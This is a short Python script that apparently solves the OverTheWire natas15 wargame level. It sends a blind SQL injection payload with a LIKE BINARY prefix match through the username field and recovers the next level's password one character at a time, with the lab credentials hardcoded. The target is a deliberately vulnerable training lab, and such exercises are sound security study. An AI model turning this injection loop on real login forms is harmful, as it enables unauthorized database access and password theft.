import requests                 #type: ignore 

url="http://natas15.natas.labs.overthewire.org"
auth=("natas15","SdqIqBsFcz3yotlNYErZSZwblkm0lrvx")
data={"username":"username"}
params={"debug":1}

searchspace="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

password=""

fixedquery='natas16" and password LIKE BINARY "'

for k in range(32):
    for i in range(62):
        query=f'{fixedquery}{password}{searchspace[i]}%"; SELECT * from users where username="natas16'
        # print(query)
        data["username"]=query  
        r=requests.post(url,auth=auth,data=data,params=params)

        print(r.text)

        if "This user exists" in r.text:
            password+=searchspace[i]
            print(f"found: {password}")
        
        else:
            print(False)

print(f"password: {password}")